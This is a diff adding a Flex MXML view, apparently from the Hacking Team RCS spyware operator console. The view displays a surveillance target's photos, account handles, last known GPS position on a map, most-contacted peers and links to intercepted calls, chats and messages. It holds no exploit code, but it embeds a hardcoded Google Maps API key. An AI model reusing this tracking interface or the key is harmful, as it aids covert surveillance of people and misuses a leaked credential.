@@ -1,0 +1,659 @@
+<?xml version="1.0" encoding="utf-8"?>
+<s:BorderContainer xmlns:fx="http://ns.adobe.com/mxml/2009"
+									 xmlns:s="library://ns.adobe.com/flex/spark"
+									 xmlns:mx="library://ns.adobe.com/flex/mx"
+									 xmlns:maps="com.google.maps.*"
+									 xmlns:components="it.ht.rcs.console.entities.view.components.*"
+									 height="100%"
+									 width="100%"
+									 borderColor="0xCCCCCC"
+									 backgroundColor="0xFFFFFF"
+									 backgroundAlpha="1"
+									 addedToStage="onAddedToStage()"
+									 removedFromStage="onRemovedFromStage()">
+	<fx:Declarations>
+		<s:Fade id="fadeIn"
+						alphaFrom="0"
+						alphaTo="1"
+						duration="150"/>
+		<s:Fade id="fadeOut"
+						alphaFrom="1"
+						alphaTo="0"
+						duration="150"/>
+
+	</fx:Declarations>
+	<fx:Metadata>
+    [Event(name="update", type="flash.events.Event")]
+    
+  </fx:Metadata>
+	<fx:Script>
+		<![CDATA[
+			import com.google.maps.LatLng;
+			import com.google.maps.LatLngBounds;
+			import com.google.maps.Map;
+			import com.google.maps.MapType;
+			import com.google.maps.controls.MapTypeControl;
+			import com.google.maps.controls.PositionControl;
+			import com.google.maps.controls.ZoomControl;
+			import com.google.maps.interfaces.IOverlay;
+			import com.google.maps.interfaces.IPane;
+			import com.google.maps.overlays.GroundOverlay;
+			import com.google.maps.overlays.GroundOverlayOptions;
+			import com.google.maps.overlays.Marker;
+			import com.google.maps.PaneId;
+
+			import it.ht.rcs.console.DB;
+			import it.ht.rcs.console.entities.controller.EntityManager;
+			import it.ht.rcs.console.entities.model.Contact;
+			import it.ht.rcs.console.entities.model.Entity;
+			import it.ht.rcs.console.events.RefreshEvent;
+			import it.ht.rcs.console.events.SectionEvent;
+			import it.ht.rcs.console.monitor.controller.LicenseManager;
+			import it.ht.rcs.console.search.controller.SearchManager;
+			import it.ht.rcs.console.utils.AlertPopUp;
+			import it.ht.rcs.console.utils.Clock;
+			import it.ht.rcs.console.utils.TimeUtils;
+
+			import locale.R;
+
+			import mx.collections.ArrayCollection;
+			import mx.core.FlexGlobals;
+			import mx.events.CloseEvent;
+			import mx.managers.PopUpManager;
+			import mx.rpc.events.FaultEvent;
+			import mx.rpc.events.ResultEvent;
+
+			[Bindable]
+			private var accounts:ArrayCollection;
+
+			[Bindable]
+			private var contacts:ArrayCollection;
+
+			[Bindable]
+			private var locations:ArrayCollection;
+
+			[Bindable]
+			private var mostContacted:ArrayCollection;
+
+			//Styling
+			private var circleFillColor:uint=0xFF0000;
+			private var circleFillAlpha:Number=0.2;
+			private var circleBorderTickness:int=0.2;
+			private var circleBorderFillColor:uint=0xFF0000;
+			private var circleBorderFillAlpha:Number=0.5;
+
+			private var mapPane:IPane;
+			private var scale:Number;
+			private var centre:LatLng;
+			private var circleOverlay:IOverlay;
+			private var mapReady:Boolean;
+			private var overlays:Array=new Array();
+
+			[Embed(source='/img/stub/fakeprofile.jpg')]
+			[Bindable]
+			private var FakeProfile:Class;
+
+			public var fileReference:FileReference;
+
+			private const MILLISECONDS_PER_DAY:int=86400000;
+			private const MONTH:int=MILLISECONDS_PER_DAY * 30;
+
+			[Bindable]
+			public var entity:Entity;
+
+			[Bindable]
+			private var fromDate:Date;
+
+			[Bindable]
+			private var toDate:Date;
+
+			private function init():void
+			{
+       
+				FlexGlobals.topLevelApplication.addEventListener(RefreshEvent.REFRESH, onRefresh);
+
+				mostContacted=new ArrayCollection();
+
+				fromDate=new Date();
+				fromDate.time=fromDate.time - (1000 * 60 * 60 * 24 * 30);
+				toDate=new Date();
+				if (fromDf)
+        {
+					fromDf.selectedDate=fromDate;
+        }
+      
+				//EntityManager.instance.show(entity._id, onDetailResult);
+
+				if (loadingBox)
+					loadingBox.visible=loadingBox.includeInLayout=false;
+				if (LicenseManager.instance.correlation)
+				{
+					if (loadingBox)
+          {
+					loadingBox.visible=loadingBox.includeInLayout=true;
+          }
+
+					//EntityManager.instance.mostContacted(entity._id, formatDate(fromDate), formatDate(toDate), "10", onContactResult, onContactFault);
+				}
+				else
+				{
+					if (contactsList)
+						contactsList.enabled=false; //TODO ADD A MESSAGE
+					if (loadingBox)
+						loadingBox.visible=loadingBox.includeInLayout=false;
+				}
+				
+					callLater(onRefresh, [null])
+			
+			}
+
+			private function filter():void
+			{
+				fromDate=fromDf.selectedDate;
+				toDate=toDf.selectedDate;
+				loadingBox.visible=loadingBox.includeInLayout=true;
+				EntityManager.instance.mostContacted(entity._id, formatDate(fromDate), formatDate(toDate), "10", onContactResult, onContactFault);
+			}
+
+		
+			private function getFromTimestamp():int
+			{
+				fromDf.selectedDate.hours=0;
+				fromDf.selectedDate.minutes=0;
+				return Clock.instance.toUTCTime(fromDf.selectedDate) / 1000;
+			}
+
+			private function getToTimestamp():int
+			{
+				toDf.selectedDate.hours=0;
+				toDf.selectedDate.minutes=0;
+				return Clock.instance.toUTCTime(toDf.selectedDate) / 1000;
+			}
+
+
+
+			private function doubleDigits(n:Number):String
+			{
+				if (n < 10)
+					return "0" + String(n);
+				return String(n);
+			}
+
+			private function formatDate(d:Date):String
+			{
+				return String(d.fullYear) + doubleDigits(d.month + 1) + doubleDigits(d.date);
+			}
+
+			private function onMapReady(event:Event):void
+			{
+				if (LicenseManager.instance.correlation)
+				{
+					mapReady=true;
+
+					map.addControl(new ZoomControl());
+					map.addControl(new PositionControl());
+					map.addControl(new MapTypeControl())
+
+					//range error
+
+					mapPane=map.getPaneManager().getPaneAt(PaneId.PANE_MAP);
+
+					//map.addEventListener(MapZoomEvent.ZOOM_CHANGED, onMapZoomed);
+
+					dispatchEvent(new Event("ready"));
+					if (entity)
+						drawPosition()
+
+				}
+				else
+				{
+					lastPositionTxt.text="Last known Position  (Feature not included in current License)"
+				}
+			}
+
+			private function calculateMapScale():Number
+			{
+				var topLeft:LatLng;
+				var bottomLeft:LatLng;
+				var scale:Number;
+				var distance:Number;
+
+				topLeft=mapPane.fromPaneCoordsToLatLng(new Point(0, 0));
+				bottomLeft=mapPane.fromPaneCoordsToLatLng(new Point(0, map.height));
+				distance=topLeft.distanceFrom(bottomLeft) / 1000;
+				scale=map.height / distance;
+
+				return scale;
+			}
+
+			private function drawCircle(radiusKm:Number, position:LatLng):LatLngBounds
+			{
+				if (isNaN(radiusKm) || radiusKm <= 0)
+				{
+					//return new LatLngBounds();
+					radiusKm=0.02
+				}
+
+				scale=calculateMapScale();
+				var shape:Shape=new Shape();
+				var overlay:GroundOverlay;
+				var bounds:LatLngBounds;
+				var centrePoint:Point;
+				var topLeft:LatLng;
+				var bottomRight:LatLng;
+				var options:GroundOverlayOptions;
+				var circleWidth:Number=radiusKm * 2 * scale;
+
+				shape.graphics.lineStyle(circleBorderTickness, circleBorderFillColor, circleBorderFillAlpha);
+				shape.graphics.beginFill(circleFillColor, circleFillAlpha);
+				shape.graphics.drawCircle(circleWidth * .5, circleWidth * .5, circleWidth);
+				shape.graphics.endFill();
+				centrePoint=mapPane.fromLatLngToPaneCoords(position);
+				topLeft=mapPane.fromPaneCoordsToLatLng(new Point(centrePoint.x - circleWidth * .5, centrePoint.y - circleWidth * .5));
+				bottomRight=mapPane.fromPaneCoordsToLatLng(new Point(centrePoint.x + circleWidth * .5, centrePoint.y + circleWidth * .5));
+				bounds=new LatLngBounds(topLeft, bottomRight);
+				options=new GroundOverlayOptions();
+				options.applyProjection=true;
+				circleOverlay=new GroundOverlay(shape, bounds, options);
+				map.addOverlay(circleOverlay);
+				overlays.push(circleOverlay);
+
+
+
+				return bounds
+			}
+
+			private function drawPosition():void
+			{
+				if (LicenseManager.instance.correlation)
+				{
+					//remove overlays
+					for (var i:int=0; i < overlays.length; i++)
+					{
+						map.removeOverlay(overlays[i] as IOverlay);
+					}
+				if(entity.position)
+        {
+          if (entity.position.latitude && entity.position.longitude)
+          {
+            var coordinates:LatLng=new LatLng(Number(entity.position.latitude), Number(entity.position.longitude));
+            var bounds:LatLngBounds=new LatLngBounds();
+            var centre:LatLng=new LatLng(coordinates.lat(), coordinates.lng());
+            map.setCenter(centre, 14, MapType.NORMAL_MAP_TYPE);
+            bounds.extend(coordinates);
+            var circleBounds:LatLngBounds=drawCircle(Number(entity.position_attr.accuracy) / 1000, coordinates);
+            bounds.union(circleBounds)
+            var marker:Marker=new Marker(coordinates);
+            map.addOverlay(marker);
+            overlays.push(marker);
+            map.setCenter(bounds.getCenter(), map.getBoundsZoomLevel(bounds));
+            lastPositionTxt.text=R.get('LAST_KNOWN_POSITION') + " ( " + TimeUtils.timestampFormatter(entity.position_attr.time * 1000) + " ): Latitude: " + entity.position.latitude + ", Longitude: " + entity.position.longitude + ", Accuracy: " + entity.position_attr.accuracy + " mt";
+            trace(TimeUtils.timestampFormatter(entity.position_attr.time * 1000));
+            map.setZoom(12)
+          }
+          else
+          {
+            lastPositionTxt.text="Last position unkown"
+            map.setZoom(1)
+          }
+        }
+					
+				}
+			}
+
+			private function onUpdate(e:Event):void
+			{
+				EntityManager.instance.show(entity._id, onDetailResult)
+			}
+
+
+			protected function onAddedToStage():void
+			{
+				init()
+			}
+
+			protected function onRemovedFromStage():void
+			{
+				photoViewer.currentPhoto="";
+				FlexGlobals.topLevelApplication.removeEventListener(RefreshEvent.REFRESH, onRefresh);
+        trace("Entity sheet removed from stage")
+			}
+
+			private function onContactResult(e:ResultEvent):void
+			{
+
+				mostContacted=new ArrayCollection();
+				var temp:ArrayCollection=e.result as ArrayCollection;
+				for (var i:int=0; i < temp.length; i++)
+				{
+					var arr:Array=temp.getItemAt(i) as Array;
+					for (var k:int=0; k < arr.length; k++)
+					{
+						var item:Contact=arr[k] as Contact;
+						mostContacted.addItem(item);
+					}
+
+				}
+				if (loadingBox)
+					loadingBox.visible=loadingBox.includeInLayout=false;
+				if (contactsList)
+					contactsList.dataProvider=mostContacted;
+			}
+
+			private function onContactFault(e:FaultEvent):void
+			{
+				trace("fault callback most contacted call")
+				loadingBox.visible=loadingBox.includeInLayout=false;
+			}
+
+			private function onDetailFault(e:FaultEvent):void
+			{
+				trace("fault callback entity show call")
+			}
+
+			private function onRefresh(e:Event=null):void
+			{
+				//  TODO REDUNDANT
+				mostContacted=new ArrayCollection();
+				EntityManager.instance.show(entity._id, onDetailResult);
+				if (loadingBox)
+					loadingBox.visible=loadingBox.includeInLayout=false;
+				if (LicenseManager.instance.correlation)
+				{
+					if (loadingBox)
+						loadingBox.visible=loadingBox.includeInLayout=true;
+					EntityManager.instance.mostContacted(entity._id, formatDate(fromDate), formatDate(toDate), "10", onContactResult, onContactFault);
+				}
+				else
+				{
+					contactsList.enabled=false;
+				}
+
+
+			}
+
+
+			private function onDetailResult(e:ResultEvent):void
+			{
+    
+				entity=e.result as Entity;
+				if (nameTxt)
+					nameTxt.text=entity.name;
+				if (descTxt)
+					descTxt.text=entity.desc;
+				if (photoViewer)
+					photoViewer.currentIndex=0;
+
+				if (entity.photos)
+				{
+					if (entity.photos.length > 0)
+					{
+						if (photoViewer)
+							photoViewer.currentPhoto=entity.photos[photoViewer.currentIndex];
+					}
+					else
+					{
+						if (photoViewer)
+							photoViewer.currentPhoto="";
+					}
+				}
+				else
+				{
+					if (photoViewer)
+						photoViewer.currentPhoto="";
+				}
+				if (handlesList)
+					handlesList.dataProvider=entity.handles;
+
+				if (mapReady)
+					drawPosition();
+				//dispatchEvent(new Event("update"));
+			}
+
+			private function addHandle():void
+			{
+				var popup:HandleForm=PopUpManager.createPopUp(FlexGlobals.topLevelApplication as DisplayObject, HandleForm, true) as HandleForm;
+				popup.entity=entity;
+				popup.addEventListener("update", onUpdate);
+				PopUpManager.centerPopUp(popup);
+			}
+
+			private function onRemoveHandle():void
+			{
+				AlertPopUp.show(R.get('CONFIRM_HANDLE_DELETION'), R.get('CONFIRM'), AlertPopUp.YES | AlertPopUp.NO, null, function(e:CloseEvent):void
+				{
+					if (e.detail == AlertPopUp.YES)
+						EntityManager.instance.deleteHandle(entity._id, handlesList.selectedItem._id, onUpdate)
+				}, null, AlertPopUp.NO);
+			}
+
+			private function jumpToEvidence(e:Event):void
+			{
+				if (contactsList.selectedItem)
+				{
+					var item:Contact=contactsList.selectedItem as Contact;
+
+					var event:SectionEvent=new SectionEvent(SectionEvent.CHANGE_SECTION);
+					event.section=SectionEvent.OPERATIONS;
+					event.subsection='evidence';
+
+					var targetId:String=entity.path[entity.path.length - 1];
+					event.item=SearchManager.instance.getItem(targetId);
+					event.evidenceTypes=["call", "chat", "message"];
+					event.info=String(item.peer + " " + item.type);
+					event.from=getFromTimestamp();
+					event.to=getToTimestamp();
+					FlexGlobals.topLevelApplication.dispatchEvent(event);
+				}
+
+			}
+
+			public function update():void
+			{
+				onUpdate(null)
+			}
+		]]>
+	</fx:Script>
+	<s:layout>
+		<s:VerticalLayout paddingBottom="10"
+											paddingLeft="10"
+											paddingRight="10"
+											paddingTop="10"
+											gap="6"/>
+	</s:layout>
+	<s:VGroup width="100%">
+		<s:HGroup width="100%">
+			<s:RichText fontFamily="Myriad"
+									fontSize="20"
+									fontWeight="bold"
+									paddingTop="2"
+									text="{entity.name}"
+									id="nameTxt"/>
+
+			<s:Spacer width="100%"/>
+			<s:HGroup verticalAlign="middle"
+								horizontalAlign="right"
+								width="100%">
+				<s:Label text="{R.get('FILTER_DATA')} "
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+				<s:Label text="{R.get('FROM')}:"
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+				<mx:DateField id="fromDf"
+											selectedDate="{fromDate}"
+											change="filter()"
+											formatString="YYYY-MM-DD"
+											enabled="{LicenseManager.instance.correlation}"/>
+				<s:Label text="{R.get('TO')}:"
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+				<mx:DateField id="toDf"
+											selectedDate="{toDate}"
+											change="filter()"
+											formatString="YYYY-MM-DD"
+											enabled="{LicenseManager.instance.correlation}"/>
+			</s:HGroup>
+		</s:HGroup>
+
+		<s:Line width="100%">
+			<s:stroke>
+				<s:SolidColorStroke color="0xCCCCCC"/>
+			</s:stroke>
+		</s:Line>
+	</s:VGroup>
+	<s:HGroup width="100%"
+						height="100%">
+		<s:VGroup width="50%"
+							height="100%">
+			<s:VGroup width="100%"
+								visible="{entity.desc!='' &amp;&amp; entity.desc!=null}"
+								includeInLayout="{entity.desc!='' &amp;&amp; entity.desc!=null}">
+
+				<s:RichText id="descTxt"
+										text="{entity.desc}"
+										width="100%"/>
+				<s:Line width="100%">
+					<s:stroke>
+						<s:SolidColorStroke color="0xCCCCCC"
+																alpha="0"/>
+					</s:stroke>
+				</s:Line>
+			</s:VGroup>
+			<s:HGroup width="100%">
+				<components:PhotoViewer id="photoViewer"
+																entity="{entity}"
+																update="onUpdate(event)"/>
+				<s:VGroup gap="0"
+									width="100%"
+									height="100%">
+					<!-- <s:Label text="Accounts:"
+										fontWeight="bold"/>-->
+					<s:List width="100%"
+									height="100%"
+									itemRenderer="it.ht.rcs.console.entities.view.HandleListRenderer"
+									dataProvider="{entity.handles}"
+									id="handlesList"/>
+					<s:HGroup gap="-1"
+										horizontalAlign="right"
+										width="100%">
+
+						<s:Button width="30"
+											label="-"
+											cornerRadius="0"
+											enabled="{handlesList.selectedItem!=null}"
+											visible="{entity.handles!=null &amp;&amp; entity.handles.length>0}"
+											toolTip="{R.get('REMOVE_HANDLE')}"
+											click="onRemoveHandle()"/>
+						<s:Button width="30"
+											label="+"
+											cornerRadius="0"
+											toolTip="{R.get('ADD_HANDLE')}"
+											click="addHandle()"/>
+					</s:HGroup>
+
+				</s:VGroup>
+
+
+			</s:HGroup>
+<s:Spacer height="20"/>
+			<s:HGroup width="100%"
+								verticalAlign="middle">
+				<s:Label text="{R.get('MOST_CONTACTED')}"
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+				<s:Label text=" (Feature not included in current License)"
+								 visible="{!LicenseManager.instance.correlation}"
+								 includeInLayout="{!LicenseManager.instance.correlation}"
+								 fontWeight="bold"
+								 alpha="0.5"/>
+				<s:Spacer width="100%"/>
+				<s:HGroup verticalAlign="middle"
+									id="loadingBox"
+									visible="{LicenseManager.instance.correlation}"
+									includeInLayout="{LicenseManager.instance.correlation}">
+
+					<s:SWFLoader source="@Embed('/img/evidence/spinner16.swf')"/>
+					<s:Label text="Retrieving data..."
+									 fontWeight="bold"/>
+				</s:HGroup>
+			</s:HGroup>
+			<s:List width="100%"
+							height="100%"
+							id="contactsList"
+							enabled="{LicenseManager.instance.correlation}"
+							itemRenderer="it.ht.rcs.console.entities.view.ContactListRenderer"
+							dataProvider="{mostContacted}"
+							doubleClickEnabled="true"
+							doubleClick="jumpToEvidence(event)"/>
+
+		</s:VGroup>
+		<s:Spacer width="6"/>
+		<s:VGroup width="60%"
+							horizontalAlign="center"
+							height="100%">
+
+			<s:BorderContainer width="100%"
+												 height="100%"
+												 borderAlpha="1"
+												 borderColor="0x666666"
+												 backgroundColor="0xCCCCCC"
+												 backgroundAlpha="0.3">
+				<s:layout>
+					<s:VerticalLayout paddingBottom="10"
+														paddingLeft="10"
+														paddingRight="10"
+														paddingTop="10"
+														gap="6"/>
+				</s:layout>
+				<s:HGroup width="100%"
+									horizontalAlign="left">
+					<s:Label id="lastPositionTxt"
+									 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+					<!--	<s:CheckBox label="Last Positions"/>
+						<s:Spacer width="10"/>
+						<s:CheckBox label="Addresses"/>
+						<s:Spacer width="10"/>
+						<s:CheckBox label="Visited Places"/>-->
+				</s:HGroup>
+				<s:VGroup paddingBottom="0"
+									paddingTop="0"
+									gap="0"
+									width="100%"
+									height="100%">
+					<s:BorderContainer width="100%"
+														 height="100%"
+														 borderAlpha="1"
+														 borderColor="0x666666"
+														 backgroundColor="0xCCCCCC"
+														 backgroundAlpha="0.3">
+						<maps:Map xmlns:maps="com.google.maps.*"
+											id="map"
+											mapevent_mapready="onMapReady(event)"
+											width="100%"
+											height="100%"
+											key="ABQIAAAA8fmTpYQsyimBWFWKgeE9PBRhMg83CBLwD9y4vh6Mu8HzQS3H_RRayLm54B1SF17x6N9sYwYVwJV_FQ"
+											url="http://www.hackingteam.it/"
+											sensor="false"
+											accessibilityDescription=""
+											enabled="{LicenseManager.instance.correlation}"/>
+						<!-- trick to disbale map -->
+						<s:BorderContainer width="100%"
+															 height="100%"
+															 borderAlpha="0"
+															 backgroundColor="0xFFFFFF"
+															 backgroundAlpha="0.5"
+															 visible="{!LicenseManager.instance.correlation}"
+															 includeInLayout="{!LicenseManager.instance.correlation}"/>
+					</s:BorderContainer>
+					<!--<s:Spacer height="6"/>
+					<s:List width="100%"
+									height="30%"
+									dataProvider="{locations}"
+									itemRenderer="it.ht.rcs.console.entities.view.AddressListRenderer"/>-->
+				</s:VGroup>
+			</s:BorderContainer>
+
+		</s:VGroup>
+	</s:HGroup>
+</s:BorderContainer>
